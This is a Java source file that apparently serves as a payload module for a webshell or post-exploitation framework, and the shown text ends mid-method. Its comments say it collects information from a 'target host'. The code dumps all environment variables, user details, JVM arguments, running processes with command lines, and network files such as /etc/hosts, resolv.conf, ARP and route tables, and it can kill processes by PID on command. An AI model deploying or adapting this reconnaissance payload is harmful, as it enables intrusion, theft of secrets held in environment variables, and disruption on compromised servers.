package org.leo.core.component;

import java.io.File;
import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.lang.management.ManagementFactory;
import java.lang.management.MemoryUsage;
import java.lang.management.RuntimeMXBean;
import java.lang.management.ThreadMXBean;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

/**
 * 收集目标主机的硬件、操作系统、Java 运行时、网络、中间件和 Web 框架信息。
 * 保持 Java 6 字节码与独立 payload 约束。
 *
 * @author LeoSpring
 */
public class BasicInfoComponent implements Runnable {

    private static final long MIDDLEWARE_CACHE_TTL_MS = 10 * 60 * 1000;

    private static volatile String hostName;
    private static volatile Map<String, Object> middlewareInfo;
    private static volatile long middlewareCacheTime;

    private ClassLoader currentThreadClassLoader;
    private Method[] optionalMethods;

    // 组件接口字段
    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            Object rawParams = h.invoke(null, null, null);
            params = rawParams instanceof HashMap
                    ? (HashMap<String, Object>) rawParams : new HashMap<String, Object>();
            results = new HashMap<String, Object>();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new HashMap<String, Object>();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    /**
     * 主要执行方法
     */
    public void invoke() {
        currentThreadClassLoader = Thread.currentThread().getContextClassLoader();
        String action = stringParam("action", "basic");
        if ("basic".equals(action)) {
            collectBasicInfo();
        } else if ("processes".equals(action)) {
            collectProcesses();
        } else if ("disks".equals(action)) {
            putSystemList("disks", getFileSystemInfo(), "java-file-store");
        } else if ("network".equals(action)) {
            collectNetwork();
        } else if ("resolveDns".equals(action)) {
            resolveDns();
        } else if ("killProcess".equals(action)) {
            killProcess();
        } else {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "未知 action: " + action);
        }
    }

    private String stringParam(String name, String fallback) {
        Object value = params == null ? null : params.get(name);
        if (value == null) return fallback;
        if (value instanceof byte[]) return new String((byte[]) value, Charset.forName("UTF-8"));
        return String.valueOf(value);
    }

    private void putSystemList(String name, List<Map<String, Object>> values, String source) {
        results.put(name, values);
        results.put("total", Integer.valueOf(values.size()));
        results.put("source", source);
        results.put("os", System.getProperty("os.name", ""));
        results.put("code", Integer.valueOf(200));
    }

    private void killProcess() {
        int pid = params.get("pid") instanceof Number
                ? ((Number) params.get("pid")).intValue() : -1;
        boolean force = Boolean.TRUE.equals(params.get("force"));
        Boolean terminated = terminateWithProcessHandle(pid, force);
        results.put("handled", Boolean.valueOf(terminated != null));
        results.put("terminated", Boolean.valueOf(Boolean.TRUE.equals(terminated)));
        results.put("pid", Integer.valueOf(pid));
        results.put("code", Integer.valueOf(terminated == null ? 501 : 200));
    }

    private void collectNetwork() {
        results.put("interfaces", getNetworkInfo());
        results.put("os", System.getProperty("os.name", ""));
        putFileIfPresent(results, "procArp", "/proc/net/arp", 64 * 1024);
        putFileIfPresent(results, "procRoute", "/proc/net/route", 64 * 1024);
        putFileIfPresent(results, "resolvConf", "/etc/resolv.conf", 64 * 1024);
        putFileIfPresent(results, "hosts", isWindows()
                ? System.getenv("SystemRoot") + "\\System32\\drivers\\etc\\hosts"
                : "/etc/hosts", 128 * 1024);
        results.put("code", Integer.valueOf(200));
    }

    private void resolveDns() {
        String hostname = stringParam("hostname", "");
        List<String> addresses = new ArrayList<String>();
        if (hostname.length() > 0) {
            try {
                InetAddress[] resolved = InetAddress.getAllByName(hostname);
                for (int i = 0; i < resolved.length; i++) addresses.add(resolved[i].getHostAddress());
            } catch (Exception error) {
                results.put("msg", error.getMessage());
            }
        }
        results.put("hostname", hostname);
        results.put("addresses", addresses);
        results.put("code", Integer.valueOf(hostname.length() == 0 ? 400
                : addresses.isEmpty() ? 404 : 200));
    }

    private void collectBasicInfo() {
        Map<String, Object> basicInfo = new HashMap<String, Object>();
        basicInfo.put("collectTime", Long.valueOf(System.currentTimeMillis()));
        basicInfo.put("HardwareInfo", getHardwareInfo());
        basicInfo.put("OSInfo", getOSInfo());
        basicInfo.put("MiddlewareInfo", getMiddlewareInfo());
        basicInfo.put("JavaRuntimeInfo", getJavaRuntimeInfo());
        basicInfo.put("UserInfo", getUserInfo());
        basicInfo.put("EnvironmentInfo", new HashMap<String, String>(System.getenv()));
        basicInfo.put("NetworkInfo", getNetworkInfo());
        basicInfo.put("FileSystemInfo", getFileSystemInfo());
        basicInfo.put("ProcessInfo", getProcessInfo());
        basicInfo.put("WebFramework", detectWebFramework());
        results.put("BasicInfo", basicInfo);
        results.put("code", 200);
    }

    /**
     * 获取硬件信息
     */
    public Map<String, Object> getHardwareInfo() {
        Map<String, Object> info = new HashMap<String, Object>();
        try {
            java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
            info.put("AvailableProcessors", Integer.valueOf(stdOs.getAvailableProcessors()));
            info.put("SystemLoadAverage", Double.valueOf(stdOs.getSystemLoadAverage()));

            // 尝试 com.sun.management 扩展方法（反射）
            try {
                Class<?> sunOsClass = Class.forName("com.sun.management.OperatingSystemMXBean");

                long totalPhysical = invokeLongMethod(stdOs, sunOsClass, "getTotalPhysicalMemorySize", -1L);
                long freePhysical = invokeLongMethod(stdOs, sunOsClass, "getFreePhysicalMemorySize", -1L);

                info.put("TotalPhysicalMemoryBytes", Long.valueOf(totalPhysical));
                info.put("FreePhysicalMemoryBytes", Long.valueOf(freePhysical));
                info.put("TotalSwapSpaceBytes", Long.valueOf(invokeLongMethod(stdOs, sunOsClass, "getTotalSwapSpaceSize", -1L)));
                info.put("FreeSwapSpaceBytes", Long.valueOf(invokeLongMethod(stdOs, sunOsClass, "getFreeSwapSpaceSize", -1L)));
            } catch (ClassNotFoundException ignored) {
                info.put("note", "com.sun.management not available, physical memory info unavailable");
            }

        } catch (Exception e) {
            info.put("error", "failed to get hardware info: " + e.getMessage());
        }
        return info;
    }

    /**
     * 获取操作系统信息
     */
    public Map<String, Object> getOSInfo() {
        Map<String, Object> info = new HashMap<String, Object>();
        try {
            java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
            RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();
            String host = getHostNameSafe();

            info.put("OSName", stdOs.getName());
            info.put("OSVersion", stdOs.getVersion());
            info.put("OSArch", stdOs.getArch());
            info.put("HostName", host);
            info.put("UptimeMs", Long.valueOf(runtime.getUptime()));
            info.put("StartTime", Long.valueOf(runtime.getStartTime()));

        } catch (Exception e) {
            info.put("error", "failed to get OS info: " + e.getMessage());
        }
        return info;
    }

    /**
     * 获取中间件信息
     */
    public Map<String, Object> getMiddlewareInfo() {
        long now = System.currentTimeMillis();
        long cacheAge = now - middlewareCacheTime;
        if (middlewareInfo != null && cacheAge >= 0 && cacheAge < MIDDLEWARE_CACHE_TTL_MS) {
            return new HashMap<String, Object>(middlewareInfo);
        }

        String middlewareType = detectMiddleware();
        Map<String, Object> info = new HashMap<String, Object>();
        info.put("MiddlewareType", middlewareType);
        try {
            if ("Tomcat".equals(middlewareType)) {
                info.put("Version", getTomcatVersion());
                info.put("Home", System.getProperty("catalina.home"));
                info.put("Base", System.getProperty("catalina.base"));
            } else if ("WebLogic".equals(middlewareType)) {
                info.put("Version", Class.forName("weblogic.version", false, currentThreadClassLoader)
                        .getMethod("getVersions").invoke(null));
                info.put("Home", System.getProperty("weblogic.home"));
                info.put("Domain", System.getProperty("weblogic.domain"));
            } else if ("WebSphere".equals(middlewareType)) {
                info.put("Version", System.getProperty("was.install.root"));
                info.put("Home", System.getProperty("was.install.root"));
            } else if ("Apusic".equals(middlewareType)) {
                info.put("Version", System.getProperty("APP_SERVER_VERSION"));
                info.put("Home", System.getProperty("APP_SERVER_HOME"));
            } else if ("Resin".equals(middlewareType)) {
                info.put("Version", Class.forName("com.caucho.Version", false, currentThreadClassLoader)
                        .getField("FULL_VERSION").get(null));
                info.put("Home", System.getProperty("APP_SERVER_HOME"));
            } else if ("Jetty".equals(middlewareType)) {
                info.put("Version", Class.forName("org.eclipse.jetty.util.Jetty", false,
                        currentThreadClassLoader).getField("VERSION").get(null));
                info.put("Home", firstProperty("jetty.base", "jetty.home"));
            } else if ("Undertow".equals(middlewareType)) {
                Class<?> version = Class.forName("io.undertow.Version", false, currentThreadClassLoader);
                info.put("Version", version.getMethod("getFullVersionString").invoke(null));
                info.put("Home", firstProperty("user.dir", "java.io.tmpdir"));
            } else if ("WildFly/JBoss".equals(middlewareType)) {
                info.put("Version", firstProperty("jboss.product.version", "jboss.as.version"));
                info.put("Home", firstProperty("jboss.server.base.dir", "jboss.home.dir"));
            } else if ("WebSphere Liberty".equals(middlewareType)) {
                info.put("Version", firstProperty("wlp.product.version", "java.runtime.version"));
                info.put("Home", firstProperty("wlp.install.dir", "server.config.dir"));
            } else if ("GlassFish/Payara".equals(middlewareType)) {
                info.put("Version", firstProperty("product.name", "glassfish.version"));
                info.put("Home", firstProperty("com.sun.aas.installRoot", "com.sun.aas.instanceRoot"));
            } else if ("TongWeb".equals(middlewareType)) {
                info.put("Version", firstProperty("tongweb.version", "server.version"));
                info.put("Home", firstProperty("tongweb.home", "server.home"));
            } else if ("BES".equals(middlewareType)) {
                info.put("Version", firstProperty("bes.version", "server.version"));
                info.put("Home", firstProperty("bes.home", "server.home"));
            } else {
                info.put("Version", "unknown");
            }
        } catch (Exception e) {
            info.put("Version", "unknown");
            info.put("Error", e.getMessage());
        }

        middlewareInfo = info;
        middlewareCacheTime = now;
        return new HashMap<String, Object>(info);
    }

    /**
     * 获取Java运行时信息
     */
    public Map<String, Object> getJavaRuntimeInfo() {
        Map<String, Object> javaInfo = new HashMap<String, Object>();
        try {
            RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();
            Runtime runtimeInstance = Runtime.getRuntime();

            // JVM 基本信息
            javaInfo.put("JVMName", System.getProperty("java.vm.name"));
            javaInfo.put("JVMVersion", System.getProperty("java.vm.version"));
            javaInfo.put("JavaVersion", System.getProperty("java.version"));
            javaInfo.put("JavaHome", System.getProperty("java.home"));
            javaInfo.put("JavaVendor", System.getProperty("java.vendor"));

            // JVM 启动参数
            javaInfo.put("JVMArguments", runtime.getInputArguments());
            javaInfo.put("ClassPath", runtime.getClassPath());

            try {
                javaInfo.put("BootClassPath", runtime.getBootClassPath());
            } catch (UnsupportedOperationException e) {
                javaInfo.put("BootClassPath", "N/A (Java 9+ module system)");
            }

            // JVM 内存信息
            javaInfo.put("TotalMemoryBytes", Long.valueOf(runtimeInstance.totalMemory()));
            javaInfo.put("FreeMemoryBytes", Long.valueOf(runtimeInstance.freeMemory()));
            javaInfo.put("MaxMemoryBytes", Long.valueOf(runtimeInstance.maxMemory()));
            MemoryUsage heap = ManagementFactory.getMemoryMXBean().getHeapMemoryUsage();
            javaInfo.put("HeapUsedBytes", Long.valueOf(heap.getUsed()));
            javaInfo.put("HeapMaxBytes", Long.valueOf(heap.getMax()));

            // 线程信息
            ThreadMXBean thread = ManagementFactory.getThreadMXBean();
            javaInfo.put("ThreadCount", Integer.valueOf(thread.getThreadCount()));
            javaInfo.put("PeakThreadCount", Integer.valueOf(thread.getPeakThreadCount()));
            javaInfo.put("TotalStartedThreadCount", Long.valueOf(thread.getTotalStartedThreadCount()));

        } catch (Exception e) {
            javaInfo.put("error", "failed to get Java runtime info: " + e.getMessage());
        }
        return javaInfo;
    }

    /**
     * 获取用户信息
     */
    public Map<String, Object> getUserInfo() {
        Map<String, Object> userInfo = new HashMap<String, Object>();
        try {
            userInfo.put("UserName", System.getProperty("user.name"));
            userInfo.put("UserHome", System.getProperty("user.home"));
            userInfo.put("UserDir", System.getProperty("user.dir"));
            userInfo.put("UserLanguage", System.getProperty("user.language"));
            userInfo.put("UserCountry", System.getProperty("user.country"));
            userInfo.put("UserTimezone", System.getProperty("user.timezone"));
        } catch (Exception e) {
            userInfo.put("error", "failed to get user info: " + e.getMessage());
        }
        return userInfo;
    }

    /** Java 7+ FileStore 反射路径，Java 6 自动回退 File.listRoots。 */
    public List<Map<String, Object>> getFileSystemInfo() {
        List<Map<String, Object>> stores = new ArrayList<Map<String, Object>>();
        try {
            Class<?> fileSystemsClass = Class.forName("java.nio.file.FileSystems");
            Class<?> fileSystemClass = Class.forName("java.nio.file.FileSystem");
            Object fileSystem = fileSystemsClass.getMethod("getDefault").invoke(null);
            Object iterable = fileSystemClass.getMethod("getFileStores").invoke(fileSystem);
            Iterator<?> iterator = ((Iterable<?>) iterable).iterator();
            Class<?> fileStoreClass = Class.forName("java.nio.file.FileStore");
            Method name = fileStoreClass.getMethod("name");
            Method type = fileStoreClass.getMethod("type");
            Method totalSpace = fileStoreClass.getMethod("getTotalSpace");
            Method usableSpace = fileStoreClass.getMethod("getUsableSpace");
            while (iterator.hasNext() && stores.size() < 256) {
                Object store = iterator.next();
                Map<String, Object> info = new HashMap<String, Object>();
                info.put("mount", fileStoreMount(String.valueOf(store)));
                info.put("name", String.valueOf(name.invoke(store)));
                info.put("fsType", String.valueOf(type.invoke(store)));
                long total = ((Number) totalSpace.invoke(store)).longValue();
                long free = ((Number) usableSpace.invoke(store)).longValue();
                addSpaceInfo(info, total, free);
                stores.add(info);
            }
        } catch (Throwable ignored) {
            // Java 6 或受限运行时由 File.listRoots 路径接管。
        }
        if (!stores.isEmpty()) return stores;

        File[] roots;
        try { roots = File.listRoots(); } catch (Throwable ignored) { return stores; }
        if (roots == null) return stores;
        for (int i = 0; i < roots.length && stores.size() < 256; i++) {
            File root = roots[i];
            Map<String, Object> info = new HashMap<String, Object>();
            info.put("mount", root.getPath());
            info.put("name", root.getPath());
            info.put("fsType", "File System");
            long total = invokeLongMethod(root, File.class, "getTotalSpace", -1L);
            long free = invokeLongMethod(root, File.class, "getUsableSpace", -1L);
            addSpaceInfo(info, total, free);
            stores.add(info);
        }
        return stores;
    }

    private void addSpaceInfo(Map<String, Object> info, long total, long free) {
        if (total < 0L || free < 0L) return;
        info.put("totalBytes", Long.valueOf(total));
        info.put("freeBytes", Long.valueOf(free));
    }

    private String fileStoreMount(String storeText) {
        if (storeText == null) return "";
        String value = storeText.trim();
        int suffix = value.lastIndexOf(" (");
        return suffix > 0 ? value.substring(0, suffix).trim() : value;
    }

    /**
     * 获取网络信息
     */
    private List<Map<String, Object>> getNetworkInfo() {
        List<Map<String, Object>> networkInfo = new ArrayList<Map<String, Object>>();
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface networkInterface = interfaces.nextElement();
                Map<String, Object> interfaceInfo = new HashMap<String, Object>();
                interfaceInfo.put("Name", networkInterface.getName());
                interfaceInfo.put("DisplayName", networkInterface.getDisplayName());
                interfaceInfo.put("IsUp", Boolean.valueOf(networkInterface.isUp()));
                interfaceInfo.put("IsLoopback", Boolean.valueOf(networkInterface.isLoopback()));
                interfaceInfo.put("IsPointToPoint", Boolean.valueOf(networkInterface.isPointToPoint()));
                interfaceInfo.put("IsVirtual", Boolean.valueOf(networkInterface.isVirtual()));
                interfaceInfo.put("MTU", Integer.valueOf(networkInterface.getMTU()));

                // 获取 MAC 地址
                byte[] mac = networkInterface.getHardwareAddress();
                if (mac != null) {
                    interfaceInfo.put("MACAddress", formatMacAddress(mac));
                }

                // 获取 IP 地址
                Enumeration<InetAddress> addresses = networkInterface.getInetAddresses();
                List<String> ipAddresses = new ArrayList<String>();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    ipAddresses.add(addr.getHostAddress());
                }
                interfaceInfo.put("IPAddresses", ipAddresses);
                networkInfo.add(interfaceInfo);
            }
        } catch (Exception e) {
            Map<String, Object> errorInfo = new HashMap<String, Object>();
            errorInfo.put("error", "failed to get network info: " + e.getMessage());
            networkInfo.add(errorInfo);
        }
        return networkInfo;
    }

    /**
     * 获取进程信息
     */
    private Map<String, Object> getProcessInfo() {
        Map<String, Object> processInfo = new HashMap<String, Object>();
        try {
            RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();
            processInfo.put("ProcessId", getProcessId());
            processInfo.put("ProcessName", System.getProperty("sun.java.command"));
            processInfo.put("StartTime", Long.valueOf(runtime.getStartTime()));
            processInfo.put("UptimeMs", Long.valueOf(runtime.getUptime()));
        } catch (Exception e) {
            processInfo.put("error", "failed to get process info: " + e.getMessage());
        }
        return processInfo;
    }

    /** ProcessHandle → JNA → /proc，响应来源与实际使用的结果保持一致。 */
    private void collectProcesses() {
        String source = "ProcessHandle";
        List<Map<String, Object>> processes = getProcessHandleProcesses();
        if (processes.isEmpty()) {
            source = "JNA";
            processes = getJnaProcesses();
        }
        if (processes.isEmpty()) {
            source = "/proc";
            processes = getProcProcesses();
        }
        putSystemList("processes", processes, source);
    }

    private List<Map<String, Object>> getProcessHandleProcesses() {
        List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
        Object stream = null;
        Method closeStream = null;
        try {
            Class<?> handleClass = Class.forName("java.lang.ProcessHandle");
            Class<?> infoClass = Class.forName("java.lang.ProcessHandle$Info");
            Class<?> baseStreamClass = Class.forName("java.util.stream.BaseStream");
            closeStream = baseStreamClass.getMethod("close");
            Method pid = handleClass.getMethod("pid");
            Method alive = handleClass.getMethod("isAlive");
            Method parentHandle = handleClass.getMethod("parent");
            Method handleInfo = handleClass.getMethod("info");
            Method commandLine = infoClass.getMethod("commandLine");
            Method commandPath = infoClass.getMethod("command");
            Method user = infoClass.getMethod("user");
            Method startInstant = infoClass.getMethod("startInstant");
            Method cpuDuration = infoClass.getMethod("totalCpuDuration");
            Method epochMilli = Class.forName("java.time.Instant").getMethod("toEpochMilli");
            Method millis = Class.forName("java.time.Duration").getMethod("toMillis");
            stream = handleClass.getMethod("allProcesses").invoke(null);
            Iterator<?> iterator = (Iterator<?>) baseStreamClass.getMethod("iterator").invoke(stream);
            while (iterator.hasNext() && processes.size() < 2000) {
                Object handle = iterator.next();
                Map<String, Object> process = new HashMap<String, Object>();
                process.put("pid", pid.invoke(handle));
                process.put("alive", alive.invoke(handle));
                Object parent = optionalValue(parentHandle.invoke(handle));
                if (parent != null) process.put("ppid", pid.invoke(parent));
                Object info = handleInfo.invoke(handle);
                putOptional(process, "cmd", commandLine.invoke(info));
                putOptional(process, "command", commandPath.invoke(info));
                putOptional(process, "user", user.invoke(info));
                Object command = process.get("command");
                process.put("name", command == null ? "" : new File(String.valueOf(command)).getName());
                Object start = optionalValue(startInstant.invoke(info));
                if (start != null) process.put("startTime", epochMilli.invoke(start));
                Object cpu = optionalValue(cpuDuration.invoke(info));
                if (cpu != null) process.put("cpuMillis", millis.invoke(cpu));
                processes.add(process);
            }
        } catch (Throwable ignored) {
            processes.clear();
        } finally {
            if (stream != null) {
                try { closeStream.invoke(stream); }
                catch (Throwable ignored) {}
            }
        }
        return processes;
    }

    private Boolean terminateWithProcessHandle(int pid, boolean force) {
        if (pid <= 0) return Boolean.FALSE;
        try {
            Class<?> handleClass = Class.forName("java.lang.ProcessHandle");
            Object optional = handleClass.getMethod("of", long.class).invoke(null, Long.valueOf(pid));
            Object handle = optionalValue(optional);
            if (handle == null) return Boolean.FALSE;
            String method = force ? "destroyForcibly" : "destroy";
            return (Boolean) handleClass.getMethod(method).invoke(handle);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private void putOptional(Map<String, Object> target, String key, Object optional) throws Exception {
        Object value = optionalValue(optional);
        if (value != null) target.put(key, value);
    }

    private Object optionalValue(Object optional) throws Exception {
        if (optional == null) return null;
        if (optionalMethods == null) {
            Class<?> type = optional.getClass();
            optionalMethods = new Method[]{type.getMethod("isPresent"), type.getMethod("get")};
        }
        Boolean present = (Boolean) optionalMethods[0].invoke(optional);
        return present.booleanValue() ? optionalMethods[1].invoke(optional) : null;
    }

    /** Windows 可用 jna-platform 时走 EnumProcesses；其他环境自然落到 /proc。 */
    private List<Map<String, Object>> getJnaProcesses() {
        List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
        if (!isWindows()) return processes;
        try {
            Class<?> psapiClass = Class.forName("com.sun.jna.platform.win32.Psapi");
            Class<?> kernelClass = Class.forName("com.sun.jna.platform.win32.Kernel32");
            Class<?> intRefClass = Class.forName("com.sun.jna.ptr.IntByReference");
            Method getValue = intRefClass.getMethod("getValue");
            Constructor<?> lengthConstructor = intRefClass.getConstructor(int.class);
            Object psapi = psapiClass.getField("INSTANCE").get(null);
            Object kernel = kernelClass.getField("INSTANCE").get(null);
            int[] pids = new int[4096];
            Object needed = intRefClass.newInstance();
            Method enumProcesses = findMethod(psapiClass, "EnumProcesses", 3);
            enumProcesses.invoke(psapi, pids, Integer.valueOf(pids.length * 4), needed);
            int count = ((Number) getValue.invoke(needed)).intValue() / 4;
            Method openProcess = findMethod(kernelClass, "OpenProcess", 3);
            Method queryImage = findMethod(kernelClass, "QueryFullProcessImageName", 4);
            Method closeHandle = findMethod(kernelClass, "CloseHandle", 1);
            char[] path = new char[32768];
            for (int i = 0; i < count && processes.size() < 2000; i++) {
                if (pids[i] <= 0) continue;
                Object handle = openProcess.invoke(kernel, Integer.valueOf(0x1000), Boolean.FALSE,
                        Integer.valueOf(pids[i]));
                if (handle == null) continue;
                try {
                    Object length = lengthConstructor.newInstance(Integer.valueOf(path.length));
                    Boolean ok = (Boolean) queryImage.invoke(kernel, handle, Integer.valueOf(0), path, length);
                    if (!ok.booleanValue()) continue;
                    int pathLength = ((Number) getValue.invoke(length)).intValue();
                    String command = new String(path, 0, pathLength);
                    Map<String, Object> process = new HashMap<String, Object>();
                    process.put("pid", Integer.valueOf(pids[i]));
                    process.put("command", command);
                    process.put("cmd", command);
                    process.put("name", new File(command).getName());
                    processes.add(process);
                } finally {
                    closeHandle.invoke(kernel, handle);
                }
            }
        } catch (Throwable ignored) {
            processes.clear();
        }
        return processes;
    }

    private Method findMethod(Class<?> type, String name, int parameterCount) throws NoSuchMethodException {
        Method[] methods = type.getMethods();
        for (int i = 0; i < methods.length; i++) {
            if (name.equals(methods[i].getName())
                    && methods[i].getParameterTypes().length == parameterCount) return methods[i];
        }
        throw new NoSuchMethodException(name);
    }

    private List<Map<String, Object>> getProcProcesses() {
        List<Map<String, Object>> processes = new ArrayList<Map<String, Object>>();
        File[] entries = new File("/proc").listFiles();
        if (entries == null) return processes;
        for (int i = 0; i < entries.length && processes.size() < 2000; i++) {
            String name = entries[i].getName();
            if (!isDigits(name)) continue;
            String status = readTextFile(new File(entries[i], "status"), 64 * 1024);
            if (status == null) continue;
            Map<String, Object> process = new HashMap<String, Object>();
            process.put("pid", Integer.valueOf(parseInt(name, -1)));
            String[] lines = status.split("\\n");
            for (int line = 0; line < lines.length; line++) {
                int colon = lines[line].indexOf(':');
                if (colon <= 0) continue;
                String key = lines[line].substring(0, colon);
                String value = lines[line].substring(colon + 1).trim();
                if ("Name".equals(key)) process.put("name", value);
                else if ("PPid".equals(key)) process.put("ppid", Integer.valueOf(parseInt(value, -1)));
                else if ("Uid".equals(key)) process.put("user", value.split("\\s+")[0]);
                else if ("VmRSS".equals(key)) process.put("memKb", Long.valueOf(parseLeadingLong(value)));
            }
            String cmdline = readTextFile(new File(entries[i], "cmdline"), 256 * 1024);
            if (cmdline != null) process.put("cmd", cmdline.replace('\0', ' ').trim());
            processes.add(process);
        }
        return processes;
    }

    private boolean isDigits(String value) {
        if (value == null || value.length() == 0) return false;
        for (int i = 0; i < value.length(); i++) if (!Character.isDigit(value.charAt(i))) return false;
        return true;
    }

    private int parseInt(String value, int fallback) {
        try { return Integer.parseInt(value.trim()); } catch (Exception ignored) { return fallback; }
    }

    private long parseLeadingLong(String value) {
        if (value == null) return 0L;
        String[] fields = value.trim().split("\\s+");
        try { return Long.parseLong(fields[0]); } catch (Exception ignored) { return 0L; }
    }

    private void putFileIfPresent(Map<String, Object> target, String key, String path, int maxBytes) {
        if (path == null || path.startsWith("null")) return;
        String value = readTextFile(new File(path), maxBytes);
        if (value != null && value.length() > 0) target.put(key, value);
    }

    private String readTextFile(File file, int maxBytes) {
        if (file == null || !file.isFile()) return null;
        FileInputStream input = null;
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        try {
            input = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int total = 0;
            int read;
            while ((read = input.read(buffer, 0, Math.min(buffer.length, maxBytes - total))) > 0) {
                output.write(buffer, 0, read);
                total += read;
                if (total >= maxBytes) break;
            }
            return new String(output.toByteArray(), Charset.forName("UTF-8"));
        } catch (Throwable ignored) {
            return null;
        } finally {
            if (input != null) try { input.close(); } catch (Throwable ignored) {}
            try { output.close(); } catch (Throwable ignored) {}
        }
    }

    private boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().indexOf("windows") >= 0;
    }

    // ==================== 反射辅助方法 ====================

    /**
     * 反射调用返回 long 的无参方法
     */
    private static long invokeLongMethod(Object obj, Class<?> clazz, String methodName, long defaultValue) {
        try {
            Method m = clazz.getMethod(methodName);
            Object result = m.invoke(obj);
            if (result instanceof Number) {
                return ((Number) result).longValue();
            }
        } catch (Exception ignored) {
        }
        return defaultValue;
    }

    // ==================== 辅助方法 ====================

    /**
     * 优先读取环境变量，最后通过 InetAddress 获取主机名。
     */
    private static String getHostNameSafe() {
        if (hostName != null) {
            return hostName;
        }
        synchronized (BasicInfoComponent.class) {
            if (hostName != null) {
                return hostName;
            }

            String name = System.getenv("HOSTNAME");
            if (name == null || name.length() == 0) name = System.getenv("COMPUTERNAME");
            if (name == null || name.length() == 0) {
                try { name = InetAddress.getLocalHost().getHostName(); }
                catch (Exception ignored) { name = "unknown"; }
            }
            hostName = name;
        }
        return hostName;
    }

    /**
     * 格式化 MAC 地址
     */
    private String formatMacAddress(byte[] mac) {
        StringBuilder sb = new StringBuilder(mac.length * 3);
        String hex = "0123456789ABCDEF";
        for (int i = 0; i < mac.length; i++) {
            if (i > 0) sb.append(':');
            int value = mac[i] & 0xFF;
            sb.append(hex.charAt(value >>> 4)).append(hex.charAt(value & 0x0F));
        }
        return sb.toString();
    }

    private String getProcessId() {
        try {
            return ManagementFactory.getRuntimeMXBean().getName().split("@")[0];
        } catch (Exception e) {
            return "unknown";
        }
    }

    private String getTomcatVersion() {
        try {
            Class<?> serverInfoClass = Class.forName("org.apache.catalina.util.ServerInfo",
                    false, currentThreadClassLoader);
            try {
                Method getServerNumber = serverInfoClass.getMethod("getServerNumber");
                Object version = getServerNumber.invoke(null);
                if (version != null && String.valueOf(version).length() > 0) {
                    return String.valueOf(version);
                }
            } catch (Exception ignored) {
            }
            Method getServerInfo = serverInfoClass.getMethod("getServerInfo");
            return (String) getServerInfo.invoke(null);
        } catch (Exception e) {
            return "unknown";
        }
    }

    private boolean exists(String className) {
        try {
            Class.forName(className, false, currentThreadClassLoader);
            return true;
        } catch (ClassNotFoundException e) {
            return false;
        }
    }

    private String detectWebFramework() {
        boolean springBoot = exists("org.springframework.boot.SpringApplication");
        if (exists("org.springframework.web.reactive.DispatcherHandler")) {
            return springBoot ? "Spring Boot (WebFlux)" : "WebFlux";
        }
        if (exists("org.springframework.web.servlet.DispatcherServlet")) {
            return springBoot ? "Spring Boot (MVC)" : "Spring MVC";
        }
        if (exists("org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter")) {
            return "Struts2";
        }
        if (exists("jakarta.faces.webapp.FacesServlet")) {
            return "Jakarta Faces";
        }
        if (exists("javax.faces.webapp.FacesServlet")) {
            return "JSF";
        }
        if (exists("org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher")) {
            return "RESTEasy (JAX-RS)";
        }
        if (exists("org.glassfish.jersey.servlet.ServletContainer")) {
            return "Jersey (JAX-RS)";
        }
        if (exists("io.quarkus.runtime.Application")) {
            return "Quarkus";
        }
        if (exists("io.micronaut.runtime.Micronaut")) {
            return "Micronaut";
        }
        if (exists("org.apache.wicket.Application")) {
            return "Apache Wicket";
        }
        if (exists("play.Application")) {
            return "Play Framework";
        }
        if (exists("jakarta.ws.rs.core.Application") || exists("javax.ws.rs.core.Application")) {
            return "JAX-RS";
        }
        if (exists("javax.servlet.Servlet") || exists("jakarta.servlet.Servlet")) {
            return "Servlet";
        }
        return "Unknown";
    }

    private String detectMiddleware() {
        if (exists("org.jboss.as.server.Main") || System.getProperty("jboss.server.base.dir") != null) {
            return "WildFly/JBoss";
        }
        if (exists("com.ibm.ws.kernel.boot.Launcher")) {
            return "WebSphere Liberty";
        }
        if (exists("fish.payara.micro.PayaraMicro")
                || exists("com.sun.enterprise.glassfish.bootstrap.ASMain")) {
            return "GlassFish/Payara";
        }
        if (exists("com.caucho.Version")) {
            return "Resin";
        }
        if (exists("com.apusic.web.container.WebContainer")) {
            return "Apusic";
        }
        if (exists("com.ibm.websphere.runtime.Server")) {
            return "WebSphere";
        }
        if (exists("weblogic.version")) {
            return "WebLogic";
        }
        if (exists("com.tongweb.web.thor.core.ContainerBase")
                || System.getProperty("tongweb.home") != null) {
            return "TongWeb";
        }
        if (exists("com.bes.enterprise.webtier.core.Container")
                || System.getProperty("bes.home") != null) {
            return "BES";
        }
        if (exists("org.apache.catalina.Server")) {
            return "Tomcat";
        }
        if (exists("org.eclipse.jetty.server.Server")) {
            return "Jetty";
        }
        if (exists("io.undertow.Undertow")
                || exists("io.undertow.servlet.spec.ServletContextImpl")) {
            return "Undertow";
        }
        return "Unknown";
    }

    private String firstProperty(String first, String second) {
        String value = System.getProperty(first);
